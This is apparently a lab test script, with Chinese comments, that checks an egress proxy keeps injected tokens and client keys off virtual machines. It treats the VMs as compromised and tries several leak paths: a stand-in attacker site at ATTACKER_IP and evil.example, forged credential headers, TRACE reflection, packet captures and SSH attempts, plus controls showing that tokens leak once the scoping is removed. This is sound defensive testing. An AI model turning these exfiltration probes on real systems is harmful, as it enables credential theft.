#!/usr/bin/env bash
# 阶段 7：凭证不落到虚拟机。把虚拟机当成已被攻破（所有操作都以 root 在虚拟机上执行），
# 逐条尝试凭证可能回到虚拟机的途径，确认拿不到；再用对照实验确认这些封堵确实在起作用。
#   H 只对指定的服务注入，凭证按虚拟机区分
#   I 发往别处的请求不带凭证
#   J 客户端证书（mTLS）：线路上没有可以带回来的秘密
#   K 虚拟机的磁盘和网卡上找不到凭证
#   L 从虚拟机够不到 Egress 上的凭证
#   M 在 Egress 上摘掉一台虚拟机的凭证，立刻生效，不用轮换
#   N 对照：去掉封堵就能拿到；以及令牌这种凭证的固有限制
set -euo pipefail
. "$(dirname "$0")/common.sh"
ATTACKER_IP=203.0.113.81   # 临时加在 public-web 上的第二个地址，代表攻击者自己控制的站点

cleanup() {
	on public-web ". /etc/lab/ifaces.env; ip addr del $ATTACKER_IP/24 dev \$IF_WAN 2>/dev/null || true" || true
	[ -z "${RESTORE:-}" ] || egress_config solution >/dev/null || echo "注意：Egress 的配置没有恢复，请执行 egress_config solution"
}
trap cleanup EXIT

# 回显服务 /reflect 的响应里，服务收到了几个凭证头。
cred_headers() { jq -r '[.headers | keys[] | select(ascii_downcase == "x-egress-credential")] | length' 2>/dev/null || echo 无法解析; }

say "准备：全部虚拟机走新方案，Egress 用正常配置"
for vm in $(cat "$STATE/legacy"); do "$(dirname "$0")/40-migrate.sh" "$vm" >/dev/null; echo "已迁移 $vm"; done
RESTORE=1
egress_config solution
on public-web ". /etc/lab/ifaces.env; ip addr replace $ATTACKER_IP/24 dev \$IF_WAN"

say "H 只对指定的服务注入，凭证按虚拟机区分"
for vm in "${VMS[@]}"; do
	r=$(get "$vm" "http://$INTRANET_IP/")
	check "H1 $vm 访问内网服务：来源地址、服务从令牌认出的调用方" "${INTRA_IP[$vm]} $vm" "$(echo "$r" | field client) $(echo "$r" | field identity)"
done
check "H2 vm-b 自带一个伪造的凭证头，服务认出的仍是" vm-b "$(get vm-b "http://$INTRANET_IP/" "-H 'x-egress-credential: forged-by-vm'" | field identity)"
check "H3 正常响应里出现的令牌数" 0 "$(body vm-a "http://$INTRANET_IP/" | tokens_in)"
check "H4 公网上指定的站点同样认出了调用方" vm-a "$(get vm-a "http://$PUBLIC_IP/" | field identity)"

say "I 发往别处的请求不带凭证"
r=$(get vm-a "http://$ATTACKER_IP/reflect")
check "I1 vm-a 访问攻击者的站点：连通，站点收到的凭证头个数" "public-web 0" "$(echo "$r" | field server) $(echo "$r" | cred_headers)"
check "I2 响应里出现的令牌数" 0 "$(echo "$r" | tokens_in)"
r=$(get vm-a "http://$PUBLIC_IP:8080/reflect")
check "I3 指定站点上没有指定的端口（8080）：连通，收到的凭证头个数" "public-web 0" "$(echo "$r" | field server) $(echo "$r" | cred_headers)"
check "I4 目的地址是内网服务、Host 却指向别处：Egress 返回" 404 "$(code vm-a "http://$INTRANET_IP/reflect" "-H 'Host: evil.example'")"
check "I5 用 TRACE 方法让服务回显请求：Egress 返回" 405 "$(code vm-a "http://$INTRANET_IP/" "-X TRACE")"
check "I6 TRACE 的响应里出现的令牌数" 0 "$(body vm-a "http://$INTRANET_IP/" "-X TRACE" | tokens_in)"

say "J 客户端证书：Egress 持有私钥，线路上没有可以带回来的秘密"
for vm in "${VMS[@]}"; do
	r=$(get "$vm" "http://$INTRANET_IP:9443/")
	check "J1 $vm 发明文请求到 9443：服务收到 TLS、来源地址、从证书认出的调用方" "true ${INTRA_IP[$vm]} $vm" \
		"$(echo "$r" | field tls) $(echo "$r" | field client) $(echo "$r" | field client_cert)"
done
r=$(get vm-a "http://$INTRANET_IP:9443/reflect" "-H 'x-egress-credential: forged-by-vm'")
check "J2 服务把请求头全部带回来：其中的凭证头个数、令牌数" "0 0" "$(echo "$r" | cred_headers) $(echo "$r" | tokens_in)"
check "J3 虚拟机绕开明文、自己向 9443 发起 TLS" 失败 "$(on vm-a "curl -sk -m 6 -o /dev/null https://$INTRANET_IP:9443/ && echo 连通 || echo 失败")"
on gw-1 ". /etc/lab/ifaces.env; rm -f /tmp/j.pcap; timeout 6 tcpdump -ni \$IF_SVC_NET -s0 -w /tmp/j.pcap 'tcp port 15001' >/dev/null 2>&1 &"
on vm-a "sleep 1; for i in 1 2 3; do curl -s -m 3 -o /dev/null http://$INTRANET_IP:9443/; done; sleep 5"
r=$(on gw-1 "echo \$(tcpdump -nr /tmp/j.pcap 2>/dev/null | wc -l) \$(tcpdump -Anr /tmp/j.pcap 2>/dev/null | grep -c 'HTTP/1.1' || true)")
if [ "${r% *}" -gt 0 ]; then echo "通过：J4 网关上抓到了这几次请求的包（${r% *} 个）"; else echo "失败：J4 网关上没有抓到包"; FAILS=$((FAILS + 1)); fi
check "J5 这些包里能看到的明文 HTTP 行数" 0 "${r#* }"

say "K 虚拟机的磁盘和网卡上找不到凭证"
# 不能出现在虚拟机上的私钥：各虚拟机的客户端私钥、内网服务和两个 CA 的私钥。只比对文件摘要，不把私钥发过去。
secret_hashes=$(sha256sum "$STATE"/tls/*.key | cut -d' ' -f1)
same_keys() { awk '$1 == "key" {print $2}' | grep -cFx -f <(echo "$secret_hashes") || true; }
# 对照：同样的扫描在 Egress 上应当找得到，说明这个扫描方法是有效的。
scan=$(scan_fs egress-1)
r="$(echo "$scan" | grep -c '^token ' || true) $(echo "$scan" | same_keys)"
if [ "${r% *}" -gt 0 ] && [ "${r#* }" -gt 0 ]; then
	echo "对照成立：K0 同样的扫描在 Egress 上找到了含令牌的文件 ${r% *} 个、实验私钥 ${r#* } 个"
else
	echo "失败：K0 扫描在 Egress 上没有找到凭证，扫描方法无效（$r）"; FAILS=$((FAILS + 1))
fi
for vm in "${VMS[@]}"; do
	scan=$(scan_fs "$vm")
	[ "$(echo "$scan" | tail -1)" = scanned ] || { echo "失败：K1 $vm 的文件系统没有扫完"; FAILS=$((FAILS + 1)); continue; }
	check "K1 $vm 的文件系统里含令牌的文件数" 0 "$(echo "$scan" | grep -c '^token ' || true)"
	check "K2 $vm 的文件系统里与实验私钥相同的文件数（比对了 $(echo "$scan" | grep -c '^key ' || true) 个含私钥标记的文件）" 0 \
		"$(echo "$scan" | same_keys)"
	check "K3 $vm 上的隧道配置和隧道网卡" "没有 没有" \
		"$(on "$vm" "[ -e /etc/wireguard/wg0.conf ] && echo 有 || echo 没有") $(on "$vm" "ip link show wg0 >/dev/null 2>&1 && echo 有 || echo 没有")"
	# 在虚拟机自己的网卡上抓包，同时访问全部指定的服务：虚拟机这一侧的线路上不应出现令牌。
	r=$(on "$vm" ". /etc/lab/ifaces.env; rm -f /tmp/k.pcap; timeout 7 tcpdump -ni \$IF_VM_NET -s0 -w /tmp/k.pcap tcp >/dev/null 2>&1 &
sleep 1
for u in http://$INTRANET_IP/ http://$INTRANET_IP:8443/ http://$INTRANET_IP:9443/ http://$PUBLIC_IP/; do curl -s -m 3 -o /dev/null \$u; done
sleep 7
echo \$(tcpdump -nr /tmp/k.pcap 2>/dev/null | wc -l) \$(tcpdump -Anr /tmp/k.pcap 2>/dev/null | grep -cE '$TOKEN_RE' || true)
rm -f /tmp/k.pcap")
	if [ "${r% *}" -gt 0 ]; then
		check "K4 $vm 访问全部指定服务期间，自己网卡上抓到的包（${r% *} 个）里的令牌数" 0 "${r#* }"
	else
		echo "失败：K4 $vm 的网卡上没有抓到包"; FAILS=$((FAILS + 1))
	fi
done

say "L 从虚拟机够不到 Egress 上的凭证"
check "L1 Egress 的配置里没有管理接口，Envoy 只监听这两个端口" "0 15006 15007" \
	"$(on egress-1 "echo \$(grep -c '^admin:' /etc/envoy/envoy.yaml || true) \$(ss -ltnp | grep envoy | awk '{print \$4}' | sed 's/.*://' | sort -un | tr '\n' ' ')" | sed 's/ $//')"
check "L2 含凭证的配置和客户端私钥的权限、属主" "600 root" "$(on egress-1 "stat -c '%a %U' /etc/envoy/envoy.yaml /etc/lab/client/*.key | sort -u | tr '\n' ' '" | sed 's/ $//')"
try_ssh="ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
check "L3 vm-a 经业务网登录 Egress" 被拒绝 "$(on vm-a "$try_ssh lab@10.1.254.20 true >/dev/null 2>&1 && echo 登录成功 || echo 被拒绝")"
check "L4 vm-a 经管理网登录 Egress" 被拒绝 "$(on vm-a "$try_ssh lab@$(node_ip egress-1) true >/dev/null 2>&1 && echo 登录成功 || echo 被拒绝")"

say "M 在 Egress 上摘掉 vm-c 的凭证"
egress_config solution "vm-a vm-b" >/dev/null
r=$(get vm-c "http://$INTRANET_IP/")
check "M1 vm-c 的请求还能到内网服务，但服务认不出调用方" "100.64.0.99 无" "$(echo "$r" | field client) $(echo "$r" | field identity)"
check "M2 vm-c 走客户端证书的请求" "HTTP 503" "$(get vm-c "http://$INTRANET_IP:9443/" | field error)"
check "M3 vm-a 不受影响" vm-a "$(get vm-a "http://$INTRANET_IP/" | field identity)"
egress_config solution >/dev/null
r=$(get vm-c "http://$INTRANET_IP/")
check "M4 放回之后 vm-c 恢复，令牌和证书都没有换" "vm-c vm-c" "$(echo "$r" | field identity) $(get vm-c "http://$INTRANET_IP:9443/" | field client_cert)"

say "N 对照"
# 把 Egress 改回“不按目的地限定”：对虚拟机发往任意站点的请求都注入。
egress_config solution "${VMS[*]}" --unscoped >/dev/null
leak "N1 不按目的地限定时，vm-a 让 Egress 把令牌发给了攻击者的站点" "$(body vm-a "http://$ATTACKER_IP/reflect" | tokens_in)"
egress_config solution >/dev/null
check "N2 恢复按目的地限定后，同样的请求拿到的令牌数" 0 "$(body vm-a "http://$ATTACKER_IP/reflect" | tokens_in)"
# 令牌的固有限制：内网服务自己把请求头带回来（调试接口、错误页），Egress 管不住。客户端证书没有这个问题（见 J2）。
leak "N3 内网服务回显请求头时，令牌回到了 vm-a（令牌这种凭证的固有限制）" "$(body vm-a "http://$INTRANET_IP/reflect" | tokens_in)"
finish
